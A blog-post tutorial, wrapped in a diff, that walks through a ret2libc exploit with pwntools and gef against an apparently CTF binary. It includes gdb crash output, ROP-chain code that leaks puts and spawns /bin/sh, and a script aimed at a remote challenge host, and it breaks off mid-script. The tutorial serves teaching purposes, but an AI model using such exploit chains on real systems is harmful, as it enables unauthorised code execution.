@@ -1,0 +1,599 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>pwn&gt; ret2libc by example :: REhex — Personal blog about reverse-engineering</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="How to perform the attack against the binary with randomized addresses of libaries in memory - ret2libc &amp;amp; pwntools by example.
+" />
+<meta name="keywords" content="reverse-engineering, development, malware-analysis, re" />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="/posts/ret2libc/" />
+
+
+
+
+<link rel="stylesheet" href="/assets/style.css">
+
+  <link rel="stylesheet" href="/assets/blue.css">
+
+
+
+<link rel="stylesheet" href="/style.css">
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="/img/apple-touch-icon-144-precomposed.png">
+
+  <link rel="shortcut icon" href="/favicon.ico">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+  <meta name="twitter:site" content="https://rehex.ninja" />
+
+<meta name="twitter:creator" content="" />
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="pwn&gt; ret2libc by example :: REhex">
+<meta property="og:description" content="How to perform the attack against the binary with randomized addresses of libaries in memory - ret2libc &amp;amp; pwntools by example.
+" />
+<meta property="og:url" content="/posts/ret2libc/" />
+<meta property="og:site_name" content="pwn&gt; ret2libc by example" />
+
+  
+    <meta property="og:image" content="/favicon.ico">
+  
+
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+
+  <meta property="article:published_time" content="2021-06-01 12:32:42 &#43;0200 CEST" />
+
+
+
+
+
+
+
+
+
+
+<meta name="google-site-verification" content="Bf1vRw0a3PdL80fr1mxdlmaJbpLwHdliGy9r3w2Qaec" />
+<meta property="og:title" content="pwn&gt; ret2libc by example" />
+<meta property="og:description" content="How to perform the attack against the binary with randomized addresses of libaries in memory - ret2libc &amp; pwntools by example." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/posts/ret2libc/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-06-01T12:32:42&#43;02:00" />
+<meta property="article:modified_time" content="2021-06-01T12:32:42&#43;02:00" /><meta property="og:site_name" content="REhex" />
+
+
+
+</head>
+<body class="">
+
+
+<div class="container full headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    REhex
+  </div>
+</a>
+
+    </div>
+    <div class="menu-trigger">menu</div>
+  </div>
+  
+    <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/tags">#tags</a></li>
+        
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="/contact">Contact</a></li>
+        
+      
+      
+    
+
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/tags">#tags</a></li>
+      
+    
+      
+        <li><a href="/about">About</a></li>
+      
+    
+      
+        <li><a href="/contact">Contact</a></li>
+      
+    
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<div class="post">
+  <h1 class="post-title">
+    <a href="/posts/ret2libc/">pwn&gt; ret2libc by example</a></h1>
+  <div class="post-meta">
+    
+      <span class="post-date">
+        2021-06-01 [Updated: 2021-06-01]
+      </span>
+    
+    
+  </div>
+
+  
+  <span class="post-tags">
+    
+    #<a href="/tags/pwn/">pwn</a>&nbsp;
+    
+    #<a href="/tags/linux/">linux</a>&nbsp;
+    
+  </span>
+  
+
+  
+
+  
+
+  <div class="post-content"><div>
+        <p>How to perform the attack against the binary with randomized addresses of libaries in memory - ret2libc &amp; pwntools by example.</p>
+<blockquote>
+<p><strong>NOTICE</strong> I&rsquo;m not very experienced in the &ldquo;offensive RE&rdquo; ~&gt; pwns. If you will find some mistakes in my explainations, then please let me know in the comments :)</p>
+</blockquote>
+<h2 id="prerequisites">Prerequisites<a href="#prerequisites" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<ul>
+<li>exploitable (linux) binary</li>
+<li>python3 + pwntools (I&rsquo;m using it in virtualenv)</li>
+<li>GDB + gef</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># quick install</span>
+sudo apt install gdb python3 python3-pip
+
+<span style="color:#75715e"># install gef (https://github.com/hugsy/gef)</span>
+wget -O ~/.gdbinit-gef.py -q http://gef.blah.cat/py
+echo source ~/.gdbinit-gef.py &gt;&gt; ~/.gdbinit
+
+<span style="color:#75715e"># install pwntools in virtualenv (https://docs.pwntools.com/en/stable/)</span>
+pip install virtualenv
+virtualenv -p python3 venv
+. ./venv/bin/activte
+pip install pwntools
+</code></pre></div><p>My exploitable binary have following properties:</p>
+<pre><code class="language-assembly" data-lang="assembly">gef➤  checksec
+[+] checksec for 'binary'
+Canary                        : ✘
+NX                            : ✓
+PIE                           : ✘
+Fortify                       : ✘
+RelRO                         : Full
+</code></pre><h2 id="hunt-for-the-exploitable-code">Hunt for the exploitable code<a href="#hunt-for-the-exploitable-code" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<blockquote>
+<p>This tutorial will focus only on binaries with enabled relocation, it will fully ignore the PIE or stack canaries.</p>
+</blockquote>
+<p>The easiest way to find the exploitable code is actually to play with the binary, learn about it&rsquo;s background. It is worth noticing that exploitable functionality will be triggered from somewhere where binary interacts with the user (receive &amp; parse packets, user input, configs)</p>
+<p>In my case the binary have only 4 &ldquo;input fields&rdquo; and only one of them allows to overwrite the allocated buffer:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">// ida pseudo-code:
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">fill</span>()
+{
+  <span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">32</span>]; <span style="color:#75715e">// [rsp+0h] [rbp-20h] BYREF
+</span><span style="color:#75715e"></span>
+  memset(buf, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(buf));
+  printf(<span style="color:#e6db74">&#34;How much data do you want to store?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&gt; &#34;</span>)
+  read(<span style="color:#ae81ff">0</span>, buf, <span style="color:#ae81ff">0x400uLL</span>);                       <span style="color:#75715e">// buffer can be overwritten
+</span><span style="color:#75715e"></span>  <span style="color:#66d9ef">return</span> printf(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Enjoy your %s&#34;</span>, buf);
+}
+</code></pre></div><p><code>buf</code> can handle only 32 bytes, but <code>read</code> can read 400, so we should be to fully fill the buffer and overwrite the return address. Stack looks like that:</p>
+<pre><code>+----------------+
+|  return addr   |   &lt;- saved address of return when call fill was exeuted
++----------------+
+|   stored_rbp   |   &lt;- saved RBP
++----------------+
+|                |
+|     buffer     |   &lt;- local variables
+|                |
++----------------+
+</code></pre><blockquote>
+<p><strong>Protip</strong></p>
+<p>ASM <code>call &lt;func&gt;</code> is contained from the 2 instructions: <code>push $rip+1, jmp &lt;func&gt;</code>, so it saves the address of the next instruction and performs jump to the called function.</p>
+<p><code>ret</code> is analogical, it consists of <code>pop</code> &amp; <code>jmp</code></p>
+</blockquote>
+<h2 id="prove-that-you-are-in-control">Prove that you are in control<a href="#prove-that-you-are-in-control" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>Next natural step is to verify that we actually can control the <code>rip</code> registry, the easiest way to achieve that is to run it in gdb with gef installed and generate the pattern:</p>
+<pre><code class="language-assembly" data-lang="assembly">gef➤  pattern create 60
+[+] Generating a pattern of 60 bytes
+aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaa
+[+] Saved as '$_gef0'
+</code></pre><blockquote>
+<p><strong>Protip</strong></p>
+<p>Generated pattern is using readable characters which are containing unique set of characters which can be easily located in the string for identifying the offset of specified substring.</p>
+</blockquote>
+<p>Then just use generated payload as input data in potentially vulnerable functionality. In my case I had to navigate to the proper menu and paste the payload as choice option. As result the program crashed and gdb handled the exception:</p>
+<pre><code class="language-assembly" data-lang="assembly">&gt; aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaa
+
+Enjoy your aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaa
+
+Program received signal SIGSEGV, Segmentation fault.
+[ Legend: Modified register | Code | Heap | Stack | String ]
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
+$rax   : 0x49
+$rbx   : 0x0
+$rcx   : 0x0
+$rdx   : 0x00007ffff7dd18c0  →  0x0000000000000000
+$rsp   : 0x00007fffffffe278  →  &quot;faaaaaaagaaaaaaahaaa\n&quot;
+$rbp   : 0x6161616161616165 (&quot;eaaaaaaa&quot;?)
+$rsi   : 0x00007fffffffbbb0  →  &quot;Enjoy your aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaa&quot;
+$rdi   : 0x1
+$rip   : 0x0000000000400eec  →  &lt;fill+162&gt; ret
+$r8    : 0x49
+$r9    : 0x3d
+$r10   : 0xffffffc3
+$r11   : 0x246
+$r12   : 0x00000000004006e0  →  &lt;_start+0&gt; xor ebp, ebp
+$r13   : 0x00007fffffffe370  →  0x0000000000000001
+$r14   : 0x0
+$r15   : 0x0
+$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
+$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
+0x00007fffffffe278│+0x0000: &quot;faaaaaaagaaaaaaahaaa\n&quot;     ← $rsp
+0x00007fffffffe280│+0x0008: &quot;gaaaaaaahaaa\n&quot;
+0x00007fffffffe288│+0x0010: 0x0000000a61616168 (&quot;haaa\n&quot;?)
+0x00007fffffffe290│+0x0018: 0x0000000000401040  →  &lt;__libc_csu_init+0&gt; push r15
+0x00007fffffffe298│+0x0020: 0x00007ffff7a05b97  →  &lt;__libc_start_main+231&gt; mov edi, eax
+0x00007fffffffe2a0│+0x0028: 0x0000000000000001
+0x00007fffffffe2a8│+0x0030: 0x00007fffffffe378  →  0x00007fffffffe5eb  →  &quot;/tmp/binary&quot;
+0x00007fffffffe2b0│+0x0038: 0x0000000100008000
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
+     0x400ee5 &lt;fill+155&gt;       call   0x400670 &lt;printf@plt&gt;
+     0x400eea &lt;fill+160&gt;       nop
+     0x400eeb &lt;fill+161&gt;       leave
+ →   0x400eec &lt;fill+162&gt;       ret
+[!] Cannot disassemble from $PC
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: &quot;binary&quot;, stopped 0x400eec in fill (), reason: SIGSEGV
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
+[#0] 0x400eec → fill()
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+0x0000000000400eec in fill ()
+</code></pre><p>Bingo! Program crashed because it tried to jump &amp; execute instructions under the invalid address. Now you can find the address which overwritten return pointer:</p>
+<pre><code class="language-assembly" data-lang="assembly">gef➤  pattern offset $rsp
+[+] Searching '$rsp'
+[+] Found at offset 40 (little-endian search) likely
+[+] Found at offset 33 (big-endian search)
+</code></pre><blockquote>
+<p><strong>Protip</strong></p>
+<p>We can find the address in <code>rsp</code>, because processor failed to execute <code>ret</code> instruction. <code>rip</code> still points to problematic instruction.</p>
+</blockquote>
+<blockquote>
+<p><strong>Protip</strong></p>
+<p>As argument for <em>pattern offset</em> you can also provide the string or hex number:</p>
+<pre><code class="language-assembly" data-lang="assembly">gef➤  pattern offset faaaaaaagaaaaaaahaa
+[+] Searching 'faaaaaaagaaaaaaahaa'
+[+] Found at offset 40 (big-endian search)
+
+gef➤  pattern offset 0x6161616161616166
+[+] Searching '0x6161616161616166'
+[+] Found at offset 40 (little-endian search) likely
+[+] Found at offset 33 (big-endian search)
+</code></pre></blockquote>
+<p>Save the found offset (40 in my case), we will need it later.</p>
+<h2 id="develop-the-exploit-ret2libc">Develop the exploit (ret2libc)<a href="#develop-the-exploit-ret2libc" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>The ret2libc consists of several simple steps:</p>
+<ol>
+<li>Leak the libc function&rsquo;s address</li>
+<li>Calculate the address of libc in memory</li>
+<li>Redirect the execution flow to the leaked libc function such as <em>system</em> to execute the <em>/bin/sh</em></li>
+</ol>
+<blockquote>
+<p><strong>Notice!</strong></p>
+<p>All steps needs to be performed during single program execution (due to the randomization). For this you need to have 2 vulnerable functions or just call the vulnerable code twice ;)</p>
+</blockquote>
+<h3 id="pwntools-quick-start">PWNtools: quick start<a href="#pwntools-quick-start" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>We are going to start from loading binaries (binary and libc) into the pwntools:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> pwn
+
+p <span style="color:#f92672">=</span> pwn<span style="color:#f92672">.</span>process(<span style="color:#e6db74">&#39;./binary&#39;</span>)
+<span style="color:#75715e">#p = pwn.remote(&#34;138.68.182.108&#34;, 30784)</span>
+
+pwn<span style="color:#f92672">.</span>context(os<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;linux&#39;</span>, arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;amd64&#39;</span>)
+<span style="color:#75715e">#pwn.context.log_level = &#39;debug&#39;</span>
+
+elf <span style="color:#f92672">=</span> pwn<span style="color:#f92672">.</span>ELF(<span style="color:#e6db74">&#34;./binary&#34;</span>)
+libc <span style="color:#f92672">=</span> pwn<span style="color:#f92672">.</span>ELF(<span style="color:#e6db74">&#34;./libc.so.6&#34;</span>)
+</code></pre></div><blockquote>
+<p><strong>Protip</strong></p>
+<p>If you want to perform this code remotely then uncomment <code>pwn.remote</code> (&amp; comment <code>pwn.process</code>), for debug logs uncomment <code>pwn.context.log_level = 'debug'</code>.</p>
+</blockquote>
+<p>Now we can pretty easily use the binaries meta information such us stored symbols, etc.</p>
+<p>It might happen that vulnerable code is stored behind some menus, for navigation through program you can use several functions:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;&gt; &#34;</span>)  <span style="color:#75715e"># receive stdout until this substring</span>
+p<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">0xff</span>)       <span style="color:#75715e"># receive n number of bytes</span>
+p<span style="color:#f92672">.</span>recvline()       <span style="color:#75715e"># receive stdout until new line</span>
+
+p<span style="color:#f92672">.</span>send(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;foo&#39;</span>)     <span style="color:#75715e"># send bytes</span>
+p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;foo&#39;</span>) <span style="color:#75715e"># send &#39;foo\n&#39; (with new line character)</span>
+
+<span style="color:#75715e"># optionally use the timeout parameter to wait for output</span>
+p<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">0xff</span>, timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">0.5</span>)
+</code></pre></div><h2 id="leak-address">Leak address<a href="#leak-address" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>So, now you managed to load the binary, execute it and navigate to vulnerable functionallity.</p>
+<p>Now it&rsquo;s time to create the payload - the easiest way to achieve it is to use <em>ROP</em> module</p>
+<p>In the code below I am constructing the ROP chain which will:</p>
+<ol>
+<li>Fill the buffer (32 bytes)</li>
+<li>Overwrite the saved base pointer on stack (8 bytes)</li>
+<li>Call <code>puts</code> to leak GOT puts address</li>
+<li>Redirect the execution flow to the same, vulnerable function (<em>fill</em> in my case)</li>
+<li>Joins the fill bytes with ROP chain</li>
+<li>Sends the payload</li>
+</ol>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">fill <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">40</span>
+rop <span style="color:#f92672">=</span> pwn<span style="color:#f92672">.</span>ROP(elf)
+rop<span style="color:#f92672">.</span>call(elf<span style="color:#f92672">.</span>plt[<span style="color:#e6db74">&#34;puts&#34;</span>], [elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#34;puts&#34;</span>]])
+rop<span style="color:#f92672">.</span>call(elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#34;fill&#34;</span>])
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>join([fill, rop<span style="color:#f92672">.</span>chain()])
+p<span style="color:#f92672">.</span>sendline(payload)
+</code></pre></div><blockquote>
+<p><strong>Under the hood of <code>rop.call</code></strong></p>
+<p>In different architectures functions are called using specific <em>call conventions</em><sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup>. For example in linux x8664: 1st argument of function is always passed via <code>rdi</code> registry. If we want to to call the function with argument we need to make sure that argument value is stored in the mentioned registry.</p>
+<p>For that we create the ROP chain which will:</p>
+<ol>
+<li>Jump to the code containing instructions taking the argument from stack and placing it in <code>rdi</code>  (<code>pop rdi</code>).</li>
+<li>Take address to jump from stack and jump to it (<code>ret</code>).</li>
+</ol>
+<p>In general <code>rop.call</code> chain will look like that:<code>&lt;pop rdi; ret addr&gt; &lt;arg&gt; &lt;func_addr&gt;</code> (pwntools is capable of finding gadgets needed to call the function will all arguments).</p>
+</blockquote>
+<blockquote>
+<p><strong>PLT vs GOT</strong><sup id="fnref:2"><a href="#fn:2" class="footnote-ref" role="doc-noteref">2</a></sup></p>
+<ul>
+<li>PLT - Procedure Linkage Table, contain stubs to jump to the target</li>
+<li>GOT - tables of the target addresses (resolved runtime)</li>
+</ul>
+<p>You can find these values by yourself:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ objdump -D ./binary| grep puts
+<span style="color:#ae81ff">0000000000400650</span> &lt;puts@plt&gt;:
+  400650:       ff <span style="color:#ae81ff">25</span> <span style="color:#ae81ff">52</span> <span style="color:#ae81ff">19</span> <span style="color:#ae81ff">20</span> <span style="color:#ae81ff">00</span>       jmpq   *0x201952<span style="color:#f92672">(</span>%rip<span style="color:#f92672">)</span>        <span style="color:#75715e"># 601fa8 &lt;puts@GLIBC_2.2.5&gt;</span>
+...
+</code></pre></div><p>We can interpret above output as:</p>
+<ul>
+<li>PLT address = <code>0x400650</code></li>
+<li>GOT entry = <code>0x601fa8</code></li>
+</ul>
+</blockquote>
+<p>After sending such prepared payload to the program the stack should look like that:</p>
+<pre><code>+----------------+
+|  ptr_plt_puts  |   &lt;- pointer to puts function which will be executed
++----------------+
+|  ptr_got_puts  |   &lt;- address to entry of puts in GOT, value will be printed by puts above
++----------------+
+|   ptr_poprdi   |   &lt;- pointer to pop rdi; ret
++----------------+
+|                |
+|      fill      |   &lt;- our &quot;fill&quot;, which just overflows the buffer and saved rbp
+|     (A*40)     |
+|                |
++----------------+
+</code></pre><p>Now we need to parse the output, this part is individual for each program. I really recommend enabling debugging output which will show transfered data.</p>
+<blockquote>
+<p><strong>Protip - Enable Debug Mode</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">pwn<span style="color:#f92672">.</span>context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;debug&#39;</span>
+</code></pre></div></blockquote>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># parse leaked address</span>
+raw_data <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
+raw_data <span style="color:#f92672">=</span> raw_data<span style="color:#f92672">.</span>strip()  <span style="color:#75715e"># \</span>
+raw_data <span style="color:#f92672">=</span> raw_data[<span style="color:#f92672">-</span><span style="color:#ae81ff">6</span>:]     <span style="color:#75715e"># - skip unnecesary data</span>
+
+leaked_puts <span style="color:#f92672">=</span> raw_data<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>) <span style="color:#75715e"># fill missing bytes with zeroes</span>
+leaked_puts <span style="color:#f92672">=</span> pwn<span style="color:#f92672">.</span>u64(leaked_puts)
+</code></pre></div><blockquote>
+<p><strong>Packing and Unpacking the bytes</strong></p>
+<p>pwntools contains built-in functions for <strong>p</strong>acking and <strong>u</strong>npacking bytes - conversion of bytes between the strings and ints according to set environment with <code>context</code> function (endianness is set automatically).</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">&gt;&gt;&gt;</span> pwn<span style="color:#f92672">.</span>p64(<span style="color:#ae81ff">0x4142424245464748</span>)
+<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;HGFEBBBA&#39;</span>
+
+<span style="color:#f92672">&gt;&gt;&gt;</span> pwn<span style="color:#f92672">.</span>u64(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;HEXIFYIT&#39;</span>)
+<span style="color:#ae81ff">6073483730898928968</span>
+<span style="color:#75715e"># 0x5449594649584548</span>
+</code></pre></div></blockquote>
+<h2 id="run-binsh">Run /bin/sh<a href="#run-binsh" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>The &ldquo;last&rdquo; step consists of the following substeps:</p>
+<ol>
+<li>Calculate the address of libc in memory</li>
+<li>Calculate the address of <code>system()</code> function and its argument (<code>&quot;/bin/sh&quot;</code>)</li>
+<li>Prepare the ropchain &amp; pass it as argument</li>
+</ol>
+<blockquote>
+<p><strong>Ok, but why?</strong></p>
+<p>You might  wondering here why not just call the <code>system()</code> directly in the previous step. It seems to be might simpler, than whole play with calling the same function once again.</p>
+<p>The reason is simple: there is no <code>system</code> plt entry in our binary, so we can&rsquo;t call it:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ objdump -D ./binary| grep <span style="color:#e6db74">&#39;system&#39;</span>
+<span style="color:#75715e"># empty output</span>
+</code></pre></div><p>We don&rsquo;t have it in our binary, so we need to find it in the memory by tracing common functions - in our case <code>puts</code>.</p>
+</blockquote>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">pwn<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;Stage 2, ret2shell&#34;</span>)
+<span style="color:#75715e"># calculate offset, base address of the libc in the memory</span>
+libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> leaked_puts <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;puts&#39;</span>]
+
+<span style="color:#75715e"># prepare the final payload</span>
+rop <span style="color:#f92672">=</span> pwn<span style="color:#f92672">.</span>ROP(libc)
+rop<span style="color:#f92672">.</span>call(rop<span style="color:#f92672">.</span>find_gadget([<span style="color:#e6db74">&#39;ret&#39;</span>])) <span style="color:#75715e"># just for fixing padding, you might not need it</span>
+rop<span style="color:#f92672">.</span>call(libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;system&#39;</span>], [next(libc<span style="color:#f92672">.</span>search(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>))]) <span style="color:#75715e"># with null-byte to make sure that we don&#39;t try to execute some /bin/sh appended with garbage like &#39;/bin/shFEFE&#39; which obviously doesn&#39;t exists in linux</span>
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>join([fill, rop<span style="color:#f92672">.</span>chain()])
+
+p<span style="color:#f92672">.</span>sendline(payload)
+p<span style="color:#f92672">.</span>interactive()
+</code></pre></div><p>The last line (<code>p.interactive()</code>) spawns the interactive shell:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ps
+  PID TTY          TIME CMD
+   <span style="color:#ae81ff">26</span> ?        00:00:00 binary
+   <span style="color:#ae81ff">27</span> ?        00:00:00 sh
+   <span style="color:#ae81ff">28</span> ?        00:00:00 sh
+</code></pre></div><h2 id="full-script">Full script<a href="#full-script" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> pwn
+
+<span style="color:#75715e">#p = pwn.process(&#39;./binary&#39;)</span>
+p <span style="color:#f92672">=</span> pwn<span style="color:#f92672">.</span>remote(<span style="color:#e6db74">&#34;138.68.182.108&#34;</span>, <span style="color:#ae81ff">30784</span>)
+
+pwn<span style="color:#f92672">.</span>context(os<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;linux&#39;</span>, arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;amd64&#39;</span>)
+<span style="color:#75715e">#pwn.context.log_level = &#39;debug&#39;</span>
+
+elf <span style="color:#f92672">=</span> pwn<span style="color:#f92672">.</span>ELF(<span style="color:#e6db74">&#34;./binary&#34;</span>)
+libc <span style="color:#f92672">=</span> pwn<span style="color:#f92672">.</span>ELF(<span style="color:#e6db74">&#34;./libc.so.6&#34;</span>)
+
+pwn<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;Stage 1, leak puts addr&#34;</span>)
+p<span style="color:#f92672">.</span>recvuntil(<span style="color:#f92672">...</span>)
+p<span style="color:#f92672">.</span>sendline(<span style="color:#f92672">...</span>)
+p<span style="color:#f92672">.</span>recv(<span style="color:#f92672">...</span>)
+
+<span style="color:#75715e"># prepare payload</span>
+fill <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">40</span>
+rop <span style="color:#f92672">=</span> pwn<span style="color:#f92672">.</span>ROP(elf)
+rop<span style="color:#f92672">.</span>call(elf<span style="color:#f92672">.</span>plt[<span style="color:#e6db74">&#34;puts&#34;</span>], [elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#34;puts&#34;</span>]])
+rop<span style="color:#f92672">.</span>call(elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#34;fill&#34;</span>])
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>join([fill, rop<span style="color:#f92672">.</span>chain()])
+
+p<span style="color:#f92672">.</span>sendline(payload)
+p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;Enjoy your &#34;</span>)
+
+<span style="color:#75715e"># extract leaked puts address</span>
+raw_data <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
+raw_data <span style="color:#f92672">=</span> raw_data<span style="color:#f92672">.</span>strip()  <span style="color:#75715e"># \</span>
+raw_data <span style="color:#f92672">=</span> raw_data[<span style="color:#f92672">-</span><span style="color:#ae81ff">6</span>:]     <span style="color:#75715e"># - skip unnecesary data</span>
+
+leaked_puts <span style="color:#f92672">=</span> raw_data<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>) <span style="color:#75715e"># fill missing bytes with zeroes</span>
+leaked_puts <span style="color:#f92672">=</span> pwn<span style="color:#f92672">.</span>u64(leaked_puts)
+pwn<span style="color:#f92672">.</span>success(f<span style="color:#e6db74">&#39;Leaked puts: {leaked_puts:x}&#39;</span>)
+
+
+pwn<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;Stage 2, ret2shell&#34;</span>)
+<span style="color:#75715e"># calculate offset, base address of the libc in the memory</span>
+libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> leaked_puts <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;puts&#39;</span>]
+
+<span style="color:#75715e"># prepare the final payload</span>
